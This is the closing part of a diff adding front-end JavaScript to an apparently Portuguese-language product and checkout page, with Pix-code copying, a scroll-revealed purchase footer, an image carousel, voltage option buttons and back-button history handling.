+        document.getElementById('copyPixBtn').addEventListener('click', () => {
+            const pixText = document.getElementById('pixCodeText').innerText.trim();
+            copyToClipboard(pixText, 'copyPixBtn');
+        });
+
+        // Lógica de Scroll para Página de Revisão
+        window.addEventListener('scroll', () => {
+            if (currentPage === 'review') {
+                const footer = document.getElementById('fixedReviewFooter');
+                const btn = document.getElementById('confirmPurchaseBtn');
+                const isDesktop = window.innerWidth >= 769;
+                const translatePrefix = isDesktop ? 'translateX(-50%) ' : '';
+                
+                // Se rolar mais de 100px, mostra o rodapé e o botão
+                if (window.scrollY > 100) {
+                    footer.style.transform = translatePrefix + 'translateY(0)';
+                    footer.style.opacity = '1';
+                    footer.style.pointerEvents = 'auto';
+                    btn.classList.add('visible');
+                } else {
+                    footer.style.transform = translatePrefix + 'translateY(200px)';
+                    footer.style.opacity = '0';
+                    footer.style.pointerEvents = 'none';
+                    btn.classList.remove('visible');
+                }
+            }
+        });
+
+        // Carousel
+        const track = document.getElementById('carouselTrack');
+        const currentIndexSpan = document.getElementById('currentIndex');
+        let startX = 0;
+        let currentTranslate = 0;
+        let prevTranslate = 0;
+        let animationID = 0;
+        let currentIndex = 0;
+
+        track.addEventListener('touchstart', touchStart);
+        track.addEventListener('touchend', touchEnd);
+        track.addEventListener('touchmove', touchMove);
+
+        // Suporte a mouse (desktop)
+        let isDragging = false;
+        track.addEventListener('mousedown', (e) => {
+            isDragging = true;
+            startX = e.clientX;
+            animationID = requestAnimationFrame(animation);
+            track.style.cursor = 'grabbing';
+        });
+        track.addEventListener('mousemove', (e) => {
+            if (!isDragging) return;
+            currentTranslate = prevTranslate + e.clientX - startX;
+        });
+        track.addEventListener('mouseup', () => {
+            if (!isDragging) return;
+            isDragging = false;
+            cancelAnimationFrame(animationID);
+            const movedBy = currentTranslate - prevTranslate;
+            if (movedBy < -80 && currentIndex < 9) currentIndex += 1;
+            if (movedBy > 80 && currentIndex > 0) currentIndex -= 1;
+            setPositionByIndex();
+            currentIndexSpan.innerText = currentIndex + 1;
+            track.style.cursor = 'grab';
+        });
+        track.addEventListener('mouseleave', () => {
+            if (!isDragging) return;
+            isDragging = false;
+            cancelAnimationFrame(animationID);
+            setPositionByIndex();
+            track.style.cursor = 'grab';
+        });
+        track.style.cursor = 'grab';
+
+        function touchStart(event) {
+            startX = event.touches[0].clientX;
+            animationID = requestAnimationFrame(animation);
+        }
+
+        function touchMove(event) {
+            const currentX = event.touches[0].clientX;
+            currentTranslate = prevTranslate + currentX - startX;
+        }
+
+        function touchEnd() {
+            cancelAnimationFrame(animationID);
+            const movedBy = currentTranslate - prevTranslate;
+
+            if (movedBy < -100 && currentIndex < 9) currentIndex += 1;
+            if (movedBy > 100 && currentIndex > 0) currentIndex -= 1;
+
+            setPositionByIndex();
+            currentIndexSpan.innerText = currentIndex + 1;
+        }
+
+        function animation() {
+            setSliderPosition();
+            if (true) animationID = requestAnimationFrame(animation);
+        }
+
+        function setSliderPosition() {
+            track.style.transform = `translateX(${currentTranslate}px)`;
+        }
+
+        function setPositionByIndex() {
+            // Usa a largura real do contêiner do carousel (funciona em desktop e mobile)
+            const containerWidth = track.parentElement.offsetWidth;
+            currentTranslate = currentIndex * -containerWidth;
+            prevTranslate = currentTranslate;
+            setSliderPosition();
+        }
+
+        // Mover o header do produto para fora do productPage no desktop
+        function setupDesktopProductHeader() {
+            if (window.innerWidth >= 769) {
+                var header = document.getElementById('mainHeader');
+                var productPage = document.getElementById('productPage');
+                if (header && header.parentElement === productPage) {
+                    // Mover o header para o body
+                    document.body.insertBefore(header, productPage);
+                    header.style.position = 'fixed';
+                    header.style.top = '0';
+                    header.style.left = '0';
+                    header.style.right = '0';
+                    header.style.width = '100%';
+                    header.style.height = '48px';
+                    header.style.maxHeight = '48px';
+                    header.style.overflow = 'hidden';
+                    header.style.zIndex = '1000';
+                    header.style.backgroundColor = '#FFD700';
+                    header.style.display = 'flex';
+                    header.style.alignItems = 'center';
+                    header.style.justifyContent = 'space-between';
+                    header.style.padding = '0 24px';
+                    header.style.boxShadow = '0 2px 4px rgba(0,0,0,0.1)';
+                    header.classList.add('desktop-header');
+                    // Adicionar padding ao productPage para compensar o header fixo
+                    productPage.style.paddingTop = '48px';
+                }
+            }
+        }
+        setupDesktopProductHeader();
+        window.addEventListener('resize', setupDesktopProductHeader);
+
+        // Função para navegar pelo carousel com setas (desktop)
+        function carouselGoTo(direction) {
+            const newIndex = currentIndex + direction;
+            if (newIndex >= 0 && newIndex <= 9) {
+                currentIndex = newIndex;
+                setPositionByIndex();
+                currentIndexSpan.innerText = currentIndex + 1;
+            }
+        }
+
+        // Mostrar setas no desktop
+        function updateCarouselArrows() {
+            const prevBtn = document.getElementById('carouselPrev');
+            const nextBtn = document.getElementById('carouselNext');
+            if (window.innerWidth >= 769) {
+                prevBtn.style.display = 'flex';
+                nextBtn.style.display = 'flex';
+            } else {
+                prevBtn.style.display = 'none';
+                nextBtn.style.display = 'none';
+            }
+        }
+        updateCarouselArrows();
+        window.addEventListener('resize', () => {
+            updateCarouselArrows();
+            // Recalcula posição do carousel ao redimensionar
+            setPositionByIndex();
+        });
+
+        // Add click functionality for voltage buttons
+        const voltageBtns = document.querySelectorAll('.btn-voltage');
+        voltageBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                voltageBtns.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+            });
+        });
+
+        // Header color transition on scroll
+        const header = document.getElementById('mainHeader');
+        window.addEventListener('scroll', () => {
+            // No mobile, o efeito de transparência é apenas na página de produto
+            if (window.innerWidth < 769) {
+                if (currentPage === 'product') {
+                    if (window.scrollY > 50) {
+                        header.classList.add('scrolled');
+                    } else {
+                        header.classList.remove('scrolled');
+                    }
+                } else {
+                    // Nas outras páginas mobile, o header deve ser sólido (se estiver visível)
+                    header.classList.add('scrolled');
+                }
+            } else {
+                // No desktop, o header é sempre sólido
+                header.classList.add('scrolled');
+            }
+        });
+
+        // Interceptar o botao voltar do navegador/celular
+        window.addEventListener('popstate', () => {
+            if (currentPage !== 'product') {
+                showPage('product');
+            }
+        });
+
+        // Adicionar entrada ao historico quando mudar de pagina
+        const originalShowPage = showPage;
+        showPage = function(pageName) {
+            if (pageName !== 'product') {
+                history.pushState({page: pageName}, '', '#' + pageName);
+            }
+            originalShowPage(pageName);
+        };
+    </script>
+</body>
+</html>
